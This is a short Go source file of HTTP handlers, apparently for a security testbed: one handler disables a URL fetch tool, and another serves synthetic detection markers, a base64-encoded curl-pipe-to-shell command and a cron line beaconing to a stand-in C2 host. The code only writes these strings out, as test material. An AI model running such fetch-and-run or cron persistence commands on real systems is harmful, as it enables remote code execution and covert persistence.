package handlers

import (
	"encoding/base64"
	"net/http"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	_ = r.URL.Query().Get("url")
	_, _ = w.Write([]byte("tool fetch disabled\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}
